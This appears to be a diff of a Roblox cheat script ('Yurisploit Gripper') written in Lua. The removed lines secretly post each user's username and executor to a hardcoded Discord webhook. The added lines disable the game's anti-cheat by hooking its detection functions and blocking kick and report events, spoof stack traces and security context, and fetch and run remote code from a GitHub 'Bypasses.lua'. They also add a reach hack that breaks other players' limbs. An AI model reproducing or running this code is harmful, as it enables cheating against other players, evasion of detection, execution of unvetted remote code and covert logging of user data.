@@ -1,132 +1,230 @@
-local webhookcheck =
-   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
-   secure_load and "Sentinel" or
-   KRNL_LOADED and "Krnl" or
-   SONA_LOADED and "Sona" or
-   "Kid with shit exploit"
-
-local url =
-   "https://discord.com/api/webhooks/1095356363846189056/9fdyjyu2Ulbz8BUytsS9A5qyGoXzDsbXpHMQLogWIF7-2F7Bk86n6TDix3AgihPYbfmC"
-local data = {
-   ["content"] = "",
-   ["embeds"] = {
-       {
-           ["title"] = "**Gripper Execution Logged!**",
-           ["description"] = "Username: " .. game.Players.LocalPlayer.Name.." with **"..webhookcheck.."**",
-           ["type"] = "rich",
-           ["color"] = tonumber(0x7269da),
-           ["image"] = {
-               ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
-                   tostring(game:GetService("Players").LocalPlayer.Name)
-           }
-       }
-   }
-}
-local newdata = game:GetService("HttpService"):JSONEncode(data)
-
-local headers = {
-   ["content-type"] = "application/json"
-}
-request = http_request or request or HttpPost or syn.request
-local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
-request(abcdef)
-
-getgenv().settings = {
-    x_range = 10,
-    y_range = 10,
-    z_range = 10,
-    Enabled = true,
-
-    Addition = 1,
-    AdditionKeybind = 'X',
-
-    Subtraction = 1, 
-    SubtractionKeybind = 'Z'
-}
-
-local LocalPlayer = game:GetService('Players').LocalPlayer
-local UserInputService = game:GetService('UserInputService')
-
-local center = workspace.CurrentCamera.ViewportSize / 2
-
-local text = Drawing.new('Text')
-text.Size = 13
-text.Font = 2
-text.Position = Vector2.new(center.X, center.Y + 150)
-text.Outline = true
-text.Color = Color3.new(1, 1, 1)
-text.Center = true
-text.Visible = true
-text.ZIndex = 5
-
-UserInputService.InputBegan:Connect(function(input)
-
-    if input.KeyCode == Enum.KeyCode[settings.AdditionKeybind] then
-        settings.x_range = settings.x_range + settings.Addition
-        settings.z_range = settings.z_range + settings.Addition
-        settings.y_range = settings.y_range + settings.Addition
-    end
-
-    if input.KeyCode == Enum.KeyCode[settings.SubtractionKeybind] then
-        settings.x_range = settings.x_range - settings.Subtraction
-        settings.z_range = settings.z_range - settings.Subtraction
-        settings.y_range = settings.y_range - settings.Subtraction
-    end
-end)
-
-while task.wait(0.2) do
-    if LocalPlayer.Backpack:FindFirstChild('Kopis') and settings.Enabled then
-        text.Text = 'range  '.. settings.x_range
-        LocalPlayer.Backpack.Kopis.ToolModel.Blade.Tip.Size = Vector3.new(settings.x_range, settings.y_range, settings.z_range)
+for i,v in next, getgc() do
+    if typeof(v) == "function" and islclosure(v) and not is_synapse_function(v) then
+        local Constants = getconstants(v)
+        
+        if table.find(Constants, "Detected") and table.find(Constants, "crash") then
+            syn.set_thread_identity(2)
+            hookfunction(v, function()
+                return wait(9e9)
+            end)
+            syn.set_thread_identity(7)
+        end
     end
 end
+local plr = game:GetService("Players").LocalPlayer
 
-getgenv().settings = {
-    x_range = 10,
-    y_range = 10,
-    z_range = 10,
-    Enabled = true,
+local cclosure = syn_newcclosure or newcclosure or nil
 
-    Addition = 1,
-    AdditionKeybind = 'X',
+if not cclosure or not hookmetamethod then
+    plr:Kick("\n\nTest kyno)\n")
+end
 
-    Subtraction = 1, 
-    SubtractionKeybind = 'Z'
-}
+local oldNamecall
+oldNamecall = hookmetamethod(game, "__namecall", cclosure(function(self,...)
+    local NamecallMethod = getnamecallmethod()
+    local args = {...}
+    
+    if NamecallMethod:lower() == "kick" and not checkcaller() then
+        if self ~= plr then
+            return oldNamecall(self,...)
+        end
+        return
+    end
+    
+    return oldNamecall(self,...)
+end))
 
-local LocalPlayer = game:GetService('Players').LocalPlayer
-local UserInputService = game:GetService('UserInputService')
+local eventbypass
 
-local center = workspace.CurrentCamera.ViewportSize / 2
+eventbypass = hookmetamethod(game, "__namecall", function(self, ...)
+    local method = getnamecallmethod()
+    local args = {...}
 
-local text = Drawing.new('Text')
-text.Size = 13
-text.Font = 2
-text.Position = Vector2.new(center.X, center.Y + 150)
-text.Outline = true
-text.Color = Color3.new(1, 1, 1)
-text.Center = true
-text.Visible = true
-text.ZIndex = 5
-
-UserInputService.InputBegan:Connect(function(input)
-
-    if input.KeyCode == Enum.KeyCode[settings.AdditionKeybind] then
-        settings.x_range = settings.x_range + settings.Addition
-        settings.z_range = settings.z_range + settings.Addition
-        settings.y_range = settings.y_range + settings.Addition
+    if not checkcaller() and self.Name == "CheatEvent" and method == "FireServer" then
+        return; 
     end
 
-    if input.KeyCode == Enum.KeyCode[settings.SubtractionKeybind] then
-        settings.x_range = settings.x_range - settings.Subtraction
-        settings.z_range = settings.z_range - settings.Subtraction
-        settings.y_range = settings.y_range - settings.Subtraction
-    end
+    return eventbypass(self, ...)
 end)
 
-while task.wait(0.2) do
-    if LocalPlayer.Backpack:FindFirstChild('Kopis') and settings.Enabled then
-        text.Text = 'range (unequip kopis to change)' .. settings.x_range
-        LocalPlayer.Backpack.Kopis.ToolModel.Blade.Tip.Size = Vector3.new(settings.x_range, settings.y_range, settings.z_range)
+local eventbypass
+
+eventbypass = hookmetamethod(game, "__namecall", function(self, ...)
+    local method = getnamecallmethod()
+    local args = {...}
+
+    if not checkcaller() and self.Name == "SwordEvent" and method == "FireServer" then
+        return; 
     end
-end
+
+    return eventbypass(self, ...)
+end)
+
+local eventbypass
+
+eventbypass = hookmetamethod(game, "__namecall", function(self, ...)
+    local method = getnamecallmethod()
+    local args = {...}
+
+    if not checkcaller() and self.Name == "SyncSound" and method == "FireServer" then
+        return; 
+    end
+
+    return eventbypass(self, ...)
+end)
+
+local eventbypass
+
+eventbypass = hookmetamethod(game, "__namecall", function(self, ...)
+    local method = getnamecallmethod()
+    local args = {...}
+
+    if not checkcaller() and self.Name == "CyphorusAnti" and method == "FireServer" then
+        return; 
+    end
+
+    return eventbypass(self, ...)
+end)
+
+--not mine
+local toProtect = {};
+local oldTraceback;
+
+local function isProtectedCaller(Function)
+	for i = 0, 30 do
+		local stackInfo = debug.getinfo(i);
+		if stackInfo then
+			if Function == stackInfo.func then
+				return true;
+			end;
+		else
+			break;
+		end;
+	end;
+	return false;
+end;
+
+oldTraceback = hookfunction(debug.traceback, function()
+	local stackTrace = oldTraceback();
+	for Function, spoofedTrace in next, toProtect do
+		if isProtectedCaller(Function) then
+
+			local Lines = {};
+			stackTrace:gsub('[^\n\r]+', function(Line)
+				Lines[#Lines + 1] = Line:gsub('^@:', spoofedTrace);
+			end);
+
+			table.remove(Lines, 1);
+			table.remove(Lines, #Lines - 1);
+			
+			return table.concat(Lines, '\n') .. '\n';
+		end;
+	end;
+
+	return stackTrace:match'[^\n\r]*\n?(.*)';
+end);
+
+getgenv().cus_secure_call = newcclosure(function(Function, Script, ...)
+
+	local old_env = getfenv();
+	toProtect[Function] = Script:GetFullName() .. ':';
+	
+	local spoof_env = select(2, pcall(getsenv, Script));
+	spoof_env = (type(spoof_env) == 'string' or not spoof_env) and getrenv() or spoof_env;
+	spoof_env.script = spoof_env.script or Script;
+
+
+	local setthreadcontext = setthreadcontext;
+	setthreadcontext(2); -- make sure to also spoof security context inbefore people do if game.HttpGet then
+	local Level = 0;
+	while true do
+		if not pcall(setfenv, Level + 2, spoof_env) then
+			break;
+		end;
+		Level = Level + 1;
+	end;
+	local securityContext = getthreadcontext and getthreadcontext() or 6; --I dunno if sentinel has this
+	local ret = table.pack( Function(...) ); 
+	
+	--[[
+		restore the environment to the exploit's, 
+		no need keep it spoofed as the function 
+		has already been called.
+	]]--
+	for i = 0, Level do
+		setfenv(i, old_env);
+	end;
+
+	setthreadcontext(securityContext) -- change security context back to default
+	--// unpack the function's returns.
+	return unpack(ret);
+end);
+--[[
+	secure_call(function Function, script Script, FunctionArgs ...)
+]]--
+
+-- local bypass
+
+local undetected_mode = false
+hookfunction(gcinfo,(function()
+    if(undetected_mode==true)then
+        return 1000
+    else
+        return wait(9e9)
+    end
+end))
+hookfunction(collectgarbage,gcinfo)
+
+-- not mine
+loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Babyhamsta/RBLX_Scripts/main/Universal/Bypasses.lua"))()
+
+_G.Reach = "10"
+_G.KeyBindHigher = "X"
+_G.KeyBindLower = "Z"
+_G.ReachOff = false -- Set this to true if you want to disable the reach lol
+
+game:GetService"RunService".Stepped:Connect(function()
+    if _G.ReachOff then return end  
+    pcall(function()
+      Sword = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Handle
+        for i,v in pairs(game.Players:GetPlayers()) do 
+            if v ~= game.Players.LocalPlayer and v.Character:FindFirstChild("Left Leg") then
+             if (game.Players.LocalPlayer.Character.Torso.Position - v.Character.Torso.Position).Magnitude <= _G.Reach then
+                   v.Character['Left Leg']:BreakJoints()
+                   v.Character['Left Leg'].Transparency = 0
+                   v.Character['Left Leg'].CanCollide = false
+                   v.Character['Left Leg'].CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(1,0,-3.5)
+                   v.Character['Left Leg']:BreakJoints()
+                   v.Character['Left Leg'].Transparency = 0
+                   v.Character['Left Leg'].CanCollide = false
+                   v.Character['Left Leg'].CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(1,0,-3.5)
+               end
+           end
+       end
+    end)
+end)
+
+local Mouse = game.Players.LocalPlayer:GetMouse()
+    Mouse.KeyDown:Connect(function(key)
+        if key == _G.KeyBindHigher then
+                 _G.Reach = _G.Reach + 1 
+            	 game.StarterGui:SetCore("SendNotification", {
+                 Title = "Yurisploit Gripper";
+                 Text = "Reach set to " .. _G.Reach;
+                 Icon = "";
+                 Duration = 1;})
+             end
+          end)
+     
+     
+     local Mouse = game.Players.LocalPlayer:GetMouse()
+    Mouse.KeyDown:Connect(function(key)
+        if key == _G.KeyBindLower then
+                 _G.Reach = _G.Reach - 1 
+            	 game.StarterGui:SetCore("SendNotification", {
+                 Title = "Yurisploit Gripper";
+                 Text = "Reach set to " .. _G.Reach;
+                 Icon = "";
+                 Duration = 1;})
+             end
+          end)
